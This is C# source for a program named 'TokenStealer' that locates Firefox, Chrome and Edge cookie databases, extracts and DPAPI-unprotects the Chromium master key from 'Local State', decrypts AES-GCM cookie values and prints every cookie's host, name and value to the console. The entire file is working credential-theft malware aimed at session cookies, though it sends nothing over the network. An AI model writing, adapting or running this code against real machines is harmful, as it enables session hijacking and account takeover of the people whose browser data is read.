using System;
using System.IO;
using Microsoft.Data.Sqlite;
using System.Linq;
using System.Security.Cryptography;
using System.Text.Json;
using System.Text.Json.Serialization;
using Newtonsoft.Json.Linq;
using System.Text;

namespace TokenStealer
{
    class Program
    {
        class LocalStateDto
        {
            [JsonPropertyName("os_crypt")]
            public OsCrypt OsCrypt { get; set; }
        }

        class OsCrypt
        {
            [JsonPropertyName("encrypted_key")]
            public string EncryptedKey { get; set; }
        }

        static void Main(string[] args)
        {
            var targetSite = ""; // "" == all

            var roamingAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            // Firefox
            Console.WriteLine("===============================================");
            Console.WriteLine("[!] Extracting from firefox\n");
            var firefoxPath = Path.Combine(roamingAppDataPath, "Mozilla", "Firefox", "Profiles");
            foreach (String firefoxProfileDir in Directory.GetDirectories(firefoxPath))
            {
                var cookieFilePath = Path.Combine(firefoxProfileDir, "cookies.sqlite");
                if (File.Exists(cookieFilePath))
                {
                    Console.WriteLine($"[*] Trying coookies in profile {firefoxProfileDir}");
                    ExtractCookies(cookieFilePath, "SELECT creationTime, host, name, value, path, expiry from moz_cookies WHERE host like \"%" + targetSite + "%\"");
                }
            }
            Console.WriteLine("===============================================\n");

            // Chrome
            Console.WriteLine("===============================================");
            Console.WriteLine("[!] Extracting from chrome\n");
            var chromePath = Path.Combine(localAppDataPath, "Google", "Chrome", "User Data", "Default", "Network", "Cookies");
            ExtractCookies(
                chromePath,
                "SELECT creation_utc, host_key, name, encrypted_value, path, expires_utc from cookies WHERE host_key like \"%" + targetSite + "%\"",
                true
            );
            Console.WriteLine("===============================================\n");

            //  Edge
            Console.WriteLine("===============================================");
            Console.WriteLine("[!] Extracting from edge\n");
            var edgePath = Path.Combine(localAppDataPath, "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies");
            ExtractCookies(
                edgePath,
                "SELECT creation_utc, host_key, name, encrypted_value, path, expires_utc from cookies WHERE host_key like \"%" + targetSite + "%\"",
                true
            );
            Console.WriteLine("===============================================\n");

            // TODO Brave
            // TODO Opera
        }

        private static string DecryptCookie(byte[] masterKey, byte[] cookie)
        {
            byte[] nonce = cookie[3..15];
            byte[] ciphertext = cookie[15..(cookie.Length - 16)];
            byte[] tag = cookie[(cookie.Length - 16)..(cookie.Length)];

            byte[] resultBytes = new byte[ciphertext.Length];

            using AesGcm aesGcm = new AesGcm(masterKey);
            aesGcm.Decrypt(nonce, ciphertext, tag, resultBytes);
            string cookieValue = Encoding.UTF8.GetString(resultBytes);
            return cookieValue;
        }

        private static byte[] GetKey(string file)
        {
            string localStateContent = File.ReadAllText(file);
            LocalStateDto localState = JsonSerializer.Deserialize<LocalStateDto>(localStateContent);
            string encryptedKey = localState?.OsCrypt?.EncryptedKey;

            // The encrypted key starts with the ASCII encoding of DPAPI (i.e. 0x4450415049) and is Base64 encoded,
            // i.e. the key must first be Base64 decoded and the first 5 bytes must be removed.
            // Afterwards a decryption with win32crypt.CryptUnprotectData is possible.
            var keyWithPrefix = Convert.FromBase64String(encryptedKey);
            var key = keyWithPrefix[5..];
            var masterKey = ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);

            return masterKey;
        }

        static void ExtractCookies(string filePath, string query, bool encrypted = false)
        {
            if (File.Exists(filePath))
            {
                using (var connection = new SqliteConnection($"Data Source={filePath}"))
                {
                    connection.Open();

                    var command = connection.CreateCommand();
                    command.CommandText = query;

                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var creationTime = reader.GetString(0);
                            var host = reader.GetString(1);
                            var name = reader.GetString(2);
                            var value = reader.GetString(3);
                            var path = reader.GetString(4);
                            var expiryTime = reader.GetString(5);

                            // decrypt if encrypted
                            if (encrypted)
                            {
                                try
                                {
                                    // The encrypted data start with the ASCII encoding of v10 (i.e. 0x763130) ...
                                    if (value.StartsWith("v10"))
                                    {
                                        // get encrypted blob from row
                                        byte[] encryptedData = new byte[reader.GetBytes(3, 0, null, 0, int.MaxValue) - 1]; // 3 = encrypted_value column
                                        reader.GetBytes(3, 0, encryptedData, 0, encryptedData.Length);

                                        string localStateFilepath = filePath + @"/../../../Local State";

                                        // Get encrypted key from local state file
                                        byte[] key = GetKey(localStateFilepath);

                                        // Decrypt cookie value
                                        value = DecryptCookie(key, encryptedData);
                                    }
                                    else
                                    {
                                        // TODO
                                        throw new Exception("[!] Cookie encrypted with DPAPI. Not implemented yet.");
                                    }

                                }
                                catch (Exception e)
                                {
                                    //Console.WriteLine(e);
                                    Console.WriteLine($"[*] Could not decode cookie with encrypted value {value}\n");
                                }
                            }

                            Console.WriteLine($"\n[*] Found Cookie:");
                            Console.WriteLine($"    name: {name}");
                            Console.WriteLine($"    creationTime: {creationTime}");
                            Console.WriteLine($"    expiryTime: {expiryTime}");
                            Console.WriteLine($"    host: {host}");
                            Console.WriteLine($"    value: {value}");
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine($"[!] Could not find Path {filePath}");
            }
        }
    }
}
